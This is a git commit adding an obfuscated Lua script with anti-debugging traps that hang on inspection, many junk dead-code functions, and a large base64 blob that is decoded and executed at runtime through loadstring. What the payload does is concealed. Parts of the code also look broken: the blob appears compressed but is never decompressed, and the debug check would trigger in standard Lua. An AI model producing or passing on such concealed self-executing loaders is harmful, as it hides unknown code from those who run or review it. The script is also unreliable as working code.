72b1f79ade4a4ba44e5fae1193f1285a3374484a
cVHjBuQuMZdoGl <doitenroirac2@gmail.com>
2026-06-12 06:41:03 +0700

    upload KXSahYyqcD.lua

---
+++ KXSahYyqcD.lua
@@ -0,0 +1,304 @@
+-- obfuscated by vearware zonypp2
+-- Seed: 509604942
+-- Protected by Vearware Anti-Tamper Technology
+-- Any attempt to modify or reverse engineer this code is prohibited
+
+local BAbTioMmoI=debug.getinfo
+local YoZawclsQf=(BAbTioMmoI~=nil)
+if YoZawclsQf then while true do end end
+local xjWDDXDT=os.clock()
+for uxYN=1,100000 do end
+local uHbLSfil=os.clock()
+if (uHbLSfil-xjWDDXDT)>0.5 then while true do end end
+local nNesdBHN=getfenv()
+if nNesdBHN~=_G then while true do end end
+
+local function yrrLrjgqIOrvWkcC(SlFJRxdx, omDUYUVH, EAcjLSkU)
+    local BncklvzD={22,40}
+    local OjtzzdAQ=4362-3974
+    local pqCaqcQw="rfCSsFfowW"
+    local nHvigzsW={69,40}
+    local fFcTZmXj={31,89}
+    for uzWW=1,3 do local zPikyYWD=uzWW*3 end
+    local GWYIWDTT={15,2}
+    local spIYM_sU="RAbzUnKPIT"
+    local djrmVICm={10,2}
+    if ((245+143)==388) then local duJSY_jm=526 end
+    local ZEvYEaoe="FLlKSuuDmk"
+    return true
+end
+local function jbSIdTnNJBrMOiqV(YxwDpp_A, ozwhsYB_)
+    local jFgSFFMg="b_iZxOjCAb"
+    for wZdt=1,9 do local XOBZKSyW=wZdt*2 end
+    for iGeA=1,6 do local OpxjIfjd=iGeA*6 end
+    local oilJfiKi=3265-8869
+    local yxuUNVMa=9847//9693
+    local eAlWACty={92,92}
+    if ((102+301)==403) then local FjDrQMti=143 end
+    local VHRdNhTY={69,9}
+    for BVqM=1,7 do local joKLLvsx=BVqM*6 end
+    return nil
+end
+local function ORessUGyfgVTwkDh(CDFpWapE)
+    for GplR=1,5 do local KqtEDhbI=GplR*2 end
+    if ((684+549)==1233) then local uDRnnceB=989 end
+    if ((828+499)==1327) then local zqywckUJ=823 end
+    for yLjg=1,6 do local oLgmKp_K=yLjg*3 end
+    if ((288+480)==768) then local gpdIsFpQ=889 end
+    local mdPoEtLz={16,59}
+    for MpBf=1,9 do local HoVwYWMS=MpBf*9 end
+    for RlDD=1,3 do local JpfRsthE=RlDD*8 end
+    local sAgePcBG=1172-2413
+    if ((38+369)==407) then local DQHnmwVE=686 end
+    local FZUOInKZ=7062//5885
+    for MRrv=1,8 do local VFIASCWJ=MRrv*3 end
+    local eCFDOQeP={24,79}
+    return 6704
+end
+local function Pjigsxc_zNEQfYTs(EfxHeKZb, BQZCDuuF, BXaXeIjs)
+    for etfj=1,10 do local K_auPMVw=etfj*6 end
+    for HhkK=1,5 do local dJnIT_MA=HhkK*5 end
+    if ((696+471)==1167) then local hnvPmMFN=380 end
+    if ((747+321)==1068) then local hMkBHuJg=941 end
+    local iRTbiXiA={75,2}
+    local fPrvURmz={61,55}
+    for raKz=1,5 do local wvrzjCrR=raKz*5 end
+    for zCep=1,6 do local GiXALXQq=zCep*9 end
+    local m_whmQe_=1969^657
+    local SJzImoTe=9058%9057
+    local JmPk_EfI={53,12}
+    local eDhcWgWb=5594+9681
+    local gMafCbuN={72,56}
+    return true
+end
+local function GeyzBfMgroNutNWA(CxQdGLlu, sljDgvHZ, NkUvyAnJ)
+    local esOFHdcY=9996*1499
+    local BaWWbXQF="ffDUG_pHZW"
+    local tabpcHHM="UBhkLeFCbj"
+    if ((432+647)==1079) then local S_PPwqMb=889 end
+    local XHeWUDf_={55,51}
+    local biPIX_zM="ThRVrfiXzc"
+    local TNbIVPtt={9,54}
+    for kZKn=1,7 do local YfimAzXn=kZKn*7 end
+    local okkvzrZk="rqYwgpHWuS"
+    local wMUBiIuN=3293^9122
+    for qXrd=1,6 do local rWAqjMVl=qXrd*2 end
+    local biLJndmu="xRCNKmiSZR"
+    local DzfwXgXQ={74,47}
+    return false
+end
+local function wnWstajFaScTKvAk(uC_zNKvg, NPDuUwqs, IccszEoa, YquMMkns)
+    local oISbSdKr="mvrKUgZhQR"
+    local PqfNazvZ={49,29}
+    local AlwRYWeR="PmAYQJs_kY"
+    local QpPTLaPT={70,96}
+    local zbZwFXCu={32,31}
+    local NJoKv_BW=5168//5426
+    local pvQFncIQ=2368-5423
+    for EeuQ=1,9 do local HDSRRqHg=EeuQ*7 end
+    local tqbdIWQq="QlLDVxuafz"
+    local AhcLxBSh={98,59}
+    return 1697
+end
+local function qovbFPicpAzaSAlq(qaLmlYig)
+    local SkaKkjUy={91,81}
+    if ((358+658)==1016) then local ltlDezba=850 end
+    local OVHUgZcZ="GACLJqlAMG"
+    if ((4+451)==455) then local mNAVsXWw=96 end
+    for sTLy=1,5 do local QmDOuwDJ=sTLy*5 end
+    local cpPvhXEM=7263-7429
+    local OagLwYbZ={60,90}
+    for qrSh=1,8 do local fRpjgnnA=qrSh*7 end
+    if ((625+203)==828) then local omyrpaSc=726 end
+    return false
+end
+local function PskDJdWIHfiBwlVL(UoCuhDRD)
+    local taTXcVA_={18,14}
+    if ((967+821)==1788) then local XDXqwVKY=576 end
+    local ImIDAkbE=6341%9112
+    if ((831+726)==1557) then local hHfxQsus=157 end
+    local MRkjnUKd="qrbRRJTEbT"
+    local GfvxsUeT=1061+4613
+    for ECLv=1,6 do local mHdhEhox=ECLv*5 end
+    if ((629+569)==1198) then local fLWjKXYC=753 end
+    local iioqWsos="qzIncXWOjh"
+    local jLKqttLL="kSxuJQuTSM"
+    local JIqjCJNy=2827-7842
+    for KmPl=1,9 do local ujPGLynE=KmPl*5 end
+    return 136
+end
+local function LPHWUGBPLqYwJOBu(NhdKTtaR, kJWl_cab, rKykMrIe)
+    local gfmDPaZT=3066//6005
+    local lcLKDNdE="hnntiDyqrY"
+    local yoshTHM_="Csd_JeQBYf"
+    local zoKhSdoq="qSXSkXCDri"
+    local OmAMPvXQ={99,28}
+    local nKloJeJO="kGSgzKbgFH"
+    local yHOvsoOc={3,78}
+    local CzSUADKp={57,71}
+    local tLAyayWl=8715+5723
+    local RxuoApXt="VndkcWHlHd"
+    local KOsNQeed="DWRsOcnoXE"
+    return nil
+end
+local function CHUcDCXpAvtpeWhb(YkuYjGcz, gRjwFQcV)
+    local JQAmkiQl="HPMguma_PU"
+    local tRBCoVGF=2743*2489
+    for fatj=1,6 do local aZDinJsg=fatj*2 end
+    if ((222+293)==515) then local ruIjKtrI=928 end
+    for Wpyc=1,4 do local OQlajpmS=Wpyc*9 end
+    return 2930
+end
+local function ofYWbwVKcKadYcCr(aCVGmUhk)
+    local anBTWChS="xDNrH_gVIr"
+    local UIGCTWky="kYrDsbDmBL"
+    for NIya=1,5 do local zlCaEnDB=NIya*9 end
+    for AUJM=1,3 do local UJFRHpfF=AUJM*9 end
+    if ((946+852)==1798) then local fdhTXyHz=211 end
+    if ((537+401)==938) then local cVvDSzbJ=928 end
+    for PQBw=1,3 do local BAiIDzIF=PQBw*8 end
+    local TDhhEhMc="HBWzaeShet"
+    for FcwE=1,10 do local oXyRUDPr=FcwE*9 end
+    if ((937+180)==1117) then local gcF_srwh=365 end
+    if ((532+240)==772) then local CCKFpovE=250 end
+    local ZznjXDgv="WE_JXcapsQ"
+    local AdCxkTYT=2447^1035
+    return nil
+end
+local function YFdZcAnFQCqeNcYJ(HwWuxziJ, HhmOKLre)
+    local YkVXpWnP={54,14}
+    local TcLUZFzV="sleXjqFIeh"
+    for lBUH=1,8 do local WZCNTtlw=lBUH*3 end
+    local OXbWFl_K="zDe_RYxkyb"
+    local MKUixHSN=783^1774
+    if ((66+33)==99) then local HvFodjvL=146 end
+    local DMhShSTZ="xfbwcbpGxN"
+    for nIMb=1,9 do local lvggJdBk=nIMb*3 end
+    for RuYr=1,4 do local anSGkZpt=RuYr*9 end
+    local imtdk_Ct={2,72}
+    local NVrPTMgJ={89,71}
+    local qxxvvMAp="AjxBNcTVio"
+    for jMpG=1,5 do local otxzqKzg=jMpG*8 end
+    local pAEBqvuL="eWbtnf_WnL"
+    for pqLu=1,7 do local wQrNCiQu=pqLu*3 end
+    return true
+end
+local function HGmiJbaubTWVqHua(WaNPpPKh, Ygcytlyu)
+    local yWxYFcvv={2,12}
+    for Tinu=1,10 do local WXgjXpwn=Tinu*8 end
+    local QewFqzDV="eXNdaZLuTW"
+    local xdAlsOJw="fhip_jGRLT"
+    for Qkle=1,9 do local IHdFSvbB=Qkle*5 end
+    for PFtd=1,8 do local EMvlrmS_=PFtd*4 end
+    local rVZnTPHg={32,26}
+    return nil
+end
+local function JRfhFUdri_nrNLKc(pHHMwYIg, VLQddrhq, rKAdSIIy, aFizLfKm)
+    local xOIUVxGW="sHOzynmRri"
+    for LVdu=1,6 do local ZslLeVsh=LVdu*7 end
+    local ErFslPgp=1115-2589
+    if ((696+301)==997) then local t_SAKMZZ=604 end
+    local SowgDXXG=3556-9090
+    local ByvEcSzo="SNMJCAdflt"
+    local hKgQyWtx={82,62}
+    local DDQjPwlv={80,55}
+    for IspD=1,5 do local UoCIRDdt=IspD*5 end
+    local yBkJhvxp="mXJaeRdupr"
+    for evYJ=1,7 do local YNySAPGe=evYJ*3 end
+    local XOtggiBl={51,83}
+    return 5893
+end
+local function vPijPTCXIabrBWWw(WeSjCHPd, dhECUpfr, xEGyuJrF)
+    local GmOnbXHk=4982+4309
+    local vnKsLSsr=1729//7237
+    local bTuyNAJb={21,16}
+    if ((955+308)==1263) then local cnbqxcOG=69 end
+    local URqhALNr="akwEFZrqhR"
+    local NNqpFtJp="MyvSPLCiST"
+    for Csaz=1,7 do local OWMzhQqd=Csaz*5 end
+    if ((548+671)==1219) then local TDpKp_Km=968 end
+    for lrwV=1,3 do local UpILzwBB=lrwV*7 end
+    local WBIRaMML=5860-2412
+    return nil
+end
+local function bLvrzgN_iLVLvzPT(aePFFXLz, dtgaWylS, XUcwAr_v)
+    local ntYQbEQR="cqlpiTKkyo"
+    if ((495+104)==599) then local GjiqxYDK=949 end
+    local lspuahXl=9027//2985
+    local eznKLToP=4611+7178
+    local kdGrvfYl={95,7}
+    local GuHQSDIy="PiykoBnx_R"
+    local nLrlykUF="Wxuaqlyfeu"
+    return false
+end
+local function LmkpQRchXRlLVMvw(sYFreYDE)
+    for BjjZ=1,7 do local owykIjRr=BjjZ*4 end
+    if ((934+199)==1133) then local KDsfBjUF=458 end
+    if ((857+525)==1382) then local iiXbISBp=232 end
+    for qhBq=1,10 do local pNNphDan=qhBq*5 end
+    if ((987+49)==1036) then local siDmPFyO=819 end
+    for UtxH=1,6 do local jqroZyeT=UtxH*7 end
+    if ((160+206)==366) then local YQKRizMY=68 end
+    local DeMMMcSv=1910%7830
+    local MDdCVdMY={14,17}
+    if ((552+842)==1394) then local ZyGvLaOn=462 end
+    local weTaGvQb="peUOjfvNZn"
+    local clGNKrAH="B_fMZumMdb"
+    local dWrFvDfO={4,33}
+    if ((191+605)==796) then local CIXnkQva=164 end
+    return 2206
+end
+local function eanjHNJUCxPWoGaO(Xp_Fgwct, ySmk_uPv, AkLZmXen, jIZzsLB_)
+    for CPLP=1,7 do local UPmWpheH=CPLP*7 end
+    local pBdHeRAM="DshAvmRmmg"
+    local Csg_bONM=6860-5672
+    if ((89+315)==404) then local kISlYppW=929 end
+    if ((262+191)==453) then local ZDwGNSzL=170 end
+    if ((67+698)==765) then local JNQSSSmd=225 end
+    for oVkU=1,7 do local zGqzvUUn=oVkU*9 end
+    local cAVrCMzj={50,24}
+    local dNahEcwM="JqIoD_DZUl"
+    local bVvgLZBQ="SewVjQyCNS"
+    for aILy=1,6 do local VscjrZxx=aILy*7 end
+    if ((669+189)==858) then local ovfYnYFn=357 end
+    local VRPsEbOS={20,21}
+    return false
+end
+local function FiyhcQQOeSexwBlq(nfobaPfL, EeomAHzB)
+    if ((220+66)==286) then local hnDXynmH=719 end
+    if ((478+330)==808) then local sdztFjUu=661 end
+    if ((417+689)==1106) then local ckgMxo_z=207 end
+    local kplOUCfc=9993-9408
+    if ((470+866)==1336) then local neJwlyXu=905 end
+    if ((533+464)==997) then local iDYmCPGb=65 end
+    local UbLfpHXW={84,51}
+    local hpfccKXY={7,16}
+    for QpNt=1,6 do local upKquyxV=QpNt*3 end
+    if ((163+251)==414) then local TSXGmbHl=646 end
+    if ((28+87)==115) then local aCqETdOS=545 end
+    local FAEXiGRg={54,28}
+    local rsmLmTek="MevPQobaSO"
+    local hbVAXFWF="kCuPpjnH_H"
+    return nil
+end
+
+local _B64="eNrtXVlz4ki2fq9fQfQ8NFg2o32pHj2wg9k3s0xMEAIlIBCSLIl1ou5vv6kF".."7BTC4GpPuT0jwsZYyl1n+c7JcxJVn0hqbDFv2vJz6lEkvm3nigpOF/4hCjFZ".."/xaDL2X6UkwkYpImx+JxjuIwiiQT8ArOCImYPQeaW9p5zYA9A9omnkha2xHY".."gUlMjNnmGgTuqLokAxnem0qqBb6p7ogGEtDShWlbJDn2gWbZ8EYn0xms9+8f".."3+Dg4nGSIDEGh2MhWdIbSsxrbLiW+vtJShIZno4BTQ5vbANM2Fh8utYmtqJr".."8YRXOXvoTTqmVDf667Rki/gf/uV0tTkC0+1qWenUgfiT1X7/e56ty1tR/N2/".."v97sNvvduvY02OyyO/H33/+Y6mYss+qZw2Kh1B12a+N9TCTu/4Y2BB9SsCr6".."bzJp2aaizZKTuWTGx4pNkcnxTjfj/uXx3gZxtM17tNfEPTqlRAKu5B8msNem".."FujbWeNEPPFfOKUT5QSJZ6XL4NdTj93WdhOype47fERBX4yCEPKxdV+QHe+e".."Pngr0LQyg1y2nu5U9dy2AovOpBX4XgB2G5gbZQLiv5jwnrtlrvo0W8wK3dq0".."3zUi4vsSU0oEyGo4UzbjQ/45l95atf3nk5W5pPRyb7Kwl6l6d6am7FZjMo20".."49chLxeHcTyPkZQHCkkcQWLZWW43HNRskRJYBIl5t4t6Y5vatVLzirHdt/4C".."Yq692NVW8xwUc5nhwe4s5uRTfRbR4xcVd+N6o6g0D+lxfTEZ5f8C4q7frkm9".."yXxV2FZ6VKRFvyhZ2b3StraUasNtqbYrQrJC0VoSvR+ovCllttY8Z3aUpZLq".."OxYyUtqhzqq+tsAr5Bho4Uh8sRrYxvtVY2iVC8YqW5xpk/vYrNKppsFAqQ66".."veESsV/86p3GrjcEj72KZG03ChxASbNsSZuApHbW3kv9kyvg+AEjfMvdGLYO".."6VF7JTK4cEcLtFvlKOoRJwLpOxFIHMcEnHP0BQH/oE4E5+WQStYsTPbjQU2v".."SJvR9r5eqTSzWkPeactVTokpWsyQFNOKB+br0A86wX+iDf0LTjjQ1mu15Lx8".."UkCbOZV4XTrwYIzJepxKzYvDbH7dq8OOnAf0qzVYv01BEbOYZfVevW0PIxHz".."JaZ0H/u3z07PTUlp9puqSDE8xuM8Qpo1qL9+vdcB0pQ8Lch/XxVnteHeitTW".."F6EphHQakgk0GxIPCorQQsOSJoNdGsyljaI73tGctl4l0avJtjJW4ZjRmi1g".."AbuutQ1pqx1du/ffnMXbPm4qcMUIZ428Rc4srUyuqU7EVHtcvOMRkfrjotrT".."inq2Dxad4UafN3efI111RTlUn/jF/BD5376QZP18EWri5VqtIGPQsIwI56uI".."T2+TicM41vFtcLyAuDYmm1E+fdhloKLmzjDkSdqimBCVmWlpspyZ+lqT4bg0".."y3DqTByvHIGWaysHh2S7WWVFuiAdv48RJHyDPxQZlPO6pbjWAVIhydzHHlin".."ivuJYF/Vuixy18bKyDQty7BnZq0NW8zoqm5Syampr1qFdJyFbRE4fCNJxvcF".."8QyJMbyzKUfQFLor19+Uy1nzURVZGn8LRmcHeUsy9G2jWWs/ZSNBH/HrzYLe".."GX01v27AIZMveKN/GNT1Wn0s9kar0t05s34aqm5VezJmreiIxL40okaR6SUZ".."78lOWByVqjeqBDwpeHC6WV9LcLmoF/IG29l4l68CsVHI9u+YM/JO66YMTEeJ".."NJQdUJ3GrugXwlUtznvC61QdTdJop3I1q6eWu6J4mCvpO/pcAYaqIbdd+BNU".."Wp6F4Wk+V41QLIlxNOu5iHhEjaTBUiqY2qPIkXjQdPD9c8t87VGf1qEK4jGS".."Fk4lPkGRmOr+qZ8XiousXu/OlpHt/GWUSUY3NWC2JFlZWz4Vn5gD3j9xPwpX".."LoOpWurZtGV7IO1mbXkcwZqIEr+S/Zovb6Z5oRMFHv2PgZWAxUfwEBfAX5IO".."tB8KMpzFW3dKFgodpNYiA56WhrgvjzMB999tcKST0jtom7Nd/bDrHpbiele1".."76h3whH8Ehwhvf4yGS2LujDXk41UOVhP4sBUyoH+XqmACHBE3PrhgAMFEpcB".."R3G2BenHVCWnbio763MAh0ONnTzBLLJWpZ6Jto6+mC8ls8pLqC9l3xvXTVB+".."EheyUQkR3heo9P4YLNA2H8uPli1yFHPHMCxS19U1VwzkzlyZLDVgOfRMJJnA".."zaDNTKH3U4ah7tu2qS9B1Yvfdve3ApeTni47DXkgLcY9RRNpksBIirrBb7qa".."bEpdoGQbcqmuFCOoH3HdF4L6utbmagSRjaD+V4f6QRH8n/BLHh12DMFjLM64".."DjuSQhx2g2erNrZAQ+Ro4WOckwTpmgMEmTi5CwVMoNyIMgpnkd5z01F2qRfL".."IsGQN5sFD6xrFzywxw4YjscE2u2AIRmkA6Co9edN/iByDH7WwcmSwO8j+yBi".."8V9iH6Do4zJKyYGVks23FsX9tnL4pIAac1nZjQmC32izxyFctogavwxS8eQi".."RMTOLg1JE4hQfB4+KXs7OxZpgrjdRviQ4AjEW/S6ZF53O3Uhv/M5WdDtubRK".."66ocMCPAzv71uMvyoiyZKMryi2EvPxxoIC8721JTZCnuQeDPCOqSR5Wknf1Q".."941hEueE6NM3hDx+RwVTHm5X3bko0MIdyfHheIPygQtPCxjlxi8RJIHyaAVk".."i+mm1RUZhrkxBjOXay26lc1hXpG1vvq5KmNR2Gaa8/zUVtZRjtYXVB08xWM0".."z7uYnUQxuzrPDOqTp7XICu/2MIHytJx+6g9EisXvGIb4DysVX1f89ttvxwEM".."2+a6vTWBSHEkJnDMhUAH/JYAvO0s35j2dvvhXK7Xd6+OvqBwAqOcKDuKQpka".."WGqp3oPTJxk04TIsgccLcKRZjCfdUAucQyP29Hy7/ZzWMyLBvVhuoak9lJ/a".."Q5E0RuLOQ2WO0X+nEZzyltBZfc+YQIJ01pHMGbAhjjV1A5j2/j5W0CX1PtY2".."AJDvY1lpZUCaRDOa3HtwWby/kCcIGrnvV3J26f1PsAye5ELSohbpzKY06Lc3".."+iHVNByLLaRQdthMy8XNtDk28/05LOQN+p/HMf8rpE6mDFa9Yeowbo/7eg91".."eCK3YHNoPmyyBdcaGsc2MAwgf8/omgYm9ovcNA49bTLJP3cPz/sGQFfmpf99".."7lkpDYuL/PB52N46uMZZ19hDYDKJ2J2/jC9/0Q7O2j9bsnjgChbo3OkjTjhd".."+08j2AW8wOLnEzlb9sAFLDiUi0MP44IjUXtSCcdoNzWN5jmEFyR93lsrw74T".."kBTOA7TPA4yACbzHTzQTkt3mV1xJ9jwpja1Lj+MfkFBx3Dt451QWnedLodBO".."QpfO6c2bKotjBOtMlSTRqYK8sV9nFtVQh81J8AUo/+yp+OIwXd2tOnKuAxuj".."H1iKDG0MZYTvWcWa+MSeCC3vKRh3i2KqNwfo3mwNdBZPT9WJOF6ssnds6Ayc".."a36wWHOwzoH+yBFYGMOx394/UV+M0pgguA4wkkIjxbW1NLMGB1kkhXMXlKMV".."vRZoksIY3iU9VKabeqbbapbqIs+jQO1EtRQn+IYYS6DeqXp529X2k77IccRb".."Qdcn4dxSDEOF0ricAqtpetmr7LUpFL+yNRqP69P1dFxTa5OwvFItbQ2V2ngK".."Dkt9ZkabHhEe/KlNjzchnie3BApjaZfTKAqNDa2qu0a6uW1AZuZC+f6dbu8r".."IbnMEfPp0rRWze91yGUcxuDCeSPX3NxveaNRXoSqgnLRKMqSzuXEeZthuSOe".."c5sNKX2CpzR67wfK8JHbOuLuD3dbo/ojQHHowUVHkwGtAhllC4BW0qb6S9KT".."6+3LSRacYNveqyDZXEsycjmrmMClyGR9bYeKozAeIhk/kp3BE3+CkwmSCedl".."eOPkWupuOxmrO82JFE1gLEvcLqKIYxPthaKMFpoukhR/R5N8gLu/N1RpH8Ba".."tmQtkzJwbrgr+cK4gUf1PQsgBemwvgdmXqMTh3JBpmGgCG250urVtDQSzbra".."vhNuwiXptWnZ8ara3dvjRWHVlOX8wAdOBESyHCdAhSAEkFdbzRnDnjIQeYq+".."ag1fNG6ZI7DneWh007AfXiAvHFsRZFPHZ8Afj9Q8B02lsbyvTSvTmZVJp8rO".."5o2D9E1JjgcauovRDLRz/NuarK/iD4STfsckLhl+/UKrshyqzUWqsenlHJ9g".."sAUSv1R3aI3L45lZPQxT+tw5x5MMVr1Us/U4rLRak81Ib1X62wgGRorip2Hg".."m4m0zlRX+/wYDU/bTI1SszjZiofxTLrjLlqvP4EDb4Zxl1QGylOu2EcvJcLb".."uqRMUFmYDFps5yUCNlx4bycIKMDXeZEf53wfocGIyT8cDaJq5MfRRcKwGO8o".."YIZGzxlUzL46LQznosDwoUwfDiDRXs4B5JnGdDyYeJL4IGD509x9HNVEt+Io".."hHAGiCr+65Lg2Boc9NXWErfLu/DcivduxZwOmNFtyV+n1w+EYsM6CEe0V1At".."SgxBVOvR2cFeGsvB4tHF0RxHBV15txwTNms/F4A6z/RaoJwvnM5BRwulm4XC".."oqhW1fJ2+bg9FfL3dGmMJNydMzxw8nmlZitgVxiK5I3uvpxmAzOwTmcDdA5x".."v8EcQxMOzrmJdJgg6ES5R0K6yfAnF95fwDsU3t/1nCbSyWeCvxSfeE/vaN7n".."1d7PnEfs/ZWsJOrCcMK3zwJ5XZ9wmsHToCdHJ5N/JW2MnihD+WTHwDuE4yNM".."skzCxdk6aKZQnD0Adbs02i9Fa6rPQtL/w1kGjUwMYRnmCs/w/DlL3CLlKkDa".."OCdq+ukZz/bYGMlTUSDZB5Zk3hZ+qHR+l+OA9R0HPMFhNIl7e0NhB17CWgGB".."78p0/+ndtrjXpC8VJn2T1H0wpeYjJTB1mwR+lVX6kRKYukJNwv3VYyoiCRxJ".."4F8ngV+d6eXmOOBJ7nSuFgUNH8fyEQKb9V2zclgvN4YoEB8lht/mG+KFJ7zT".."3ykBE3BXuLEB92sxM1dHFbsosix7HR2jwYVJ9xRkF56eIl/c/45SvFia2NXc".."kyEyBH1HCvib7bgK4NSO+1/i6ghKmrG202AmaeexNytjYJvypmVU98qonPg5".."/cAdHcskh7G0C+gJjgnXD2iHya4FTHd8nb0BYv/nhzUjV72Zp9e2rWvEmwrl".."zNg4A/y+UWKMpPV8/3gwxrrqyMwnuCa66REwerD1mTsqcPt6PEE9O5UXxWfl".."qT0dHpzD59Dek2d7KagySqbGlq6ubXAU8YEKRyxQKrbaBfMgcgJ+9/qsoJeB".."yLXDeL1bbSQ5U26B84Gc7d1cGwhaAT1G1Yu+QOd+HxgCulrexgg6po/Q3Tjr".."iIFzwz4p0J5+hGjMd9qEHzmIU3453AGT79Ls17CMN7ZjvnDQnmMYN5jaj6hG".."7cv34Rs0RebSON4M70YGE4pej7tYNIXR7teZMQKaQGdsja08zjyLAk7dJDpd".."EZDT5LCgwQ8RXPzx6+BYAqolNy2OPR7TdUybttOlp0LBFjlSuONY/lPlGYrh".."/wSeDfH7OYrybb/fm9HEV48m+Ui+oV6zTWDD48/YAdf4hLrKJkgWxHnX76JO".."wadOgcIxkvByUukLajVg7rlU5fvEYgASzdF0fBUxOF3khoPidiTSFP8QPKHd".."gGDRjkepQxH8f8/3iiBxE6cPDw8OKZrOd3P4pKdN+qBX1J9FFioLgXwJdkdt".."z+Rb7viX5GMUplwG/C9qBmHzpMPQZ2Wdx9GoSoEzKg8Do7XJZUdiTjWC5zMh".."LnnitUv+OOvsU7czHWWhicM8CAJ9S2RQwBa/JTLoJwQ5arR9pOeEftt38ZHC".."mT4K58uduABFoKGh54bZEAKJxl3OFpPUerTpixzNBw29EMIO/zpYxOj4C8jR".."XdueNaq1xYyTlFTkUvlqMvXlO47xb2jI/2NjVCxNGzmRFDgMWtzf4K3/B6ps".."zcM="
+local _B='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local _P={}
+for i=1,64 do _P[_B:sub(i,i)]=i-1 end
+_P['=']=0
+local function _D(s)
+local r={};local j=1
+for i=1,#s,4 do
+local c1=_P[s:sub(i,i)]or 0;local c2=_P[s:sub(i+1,i+1)]or 0
+local c3=_P[s:sub(i+2,i+2)]or 0;local c4=_P[s:sub(i+3,i+3)]or 0
+local n=c1*262144+c2*4096+c3*64+c4
+r[j]=string.char(math.floor(n/65536)%256)
+r[j+1]=string.char(math.floor(n/256)%256)
+r[j+2]=string.char(n%256);j=j+3
+end
+return table.concat(r)
+end
+local _C=_D(_B64)
+local _L=loadstring or load
+_L(_C)()
